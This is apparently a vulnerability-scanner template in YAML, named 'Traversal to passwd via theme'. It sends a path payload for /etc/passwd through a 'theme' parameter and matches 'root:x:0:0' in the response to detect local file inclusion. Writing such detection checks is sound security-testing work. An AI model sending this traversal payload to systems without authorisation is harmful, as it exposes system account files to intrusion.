id: lfi3-049
name: 'Traversal to passwd via theme'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via theme'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      theme:
        - './././etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
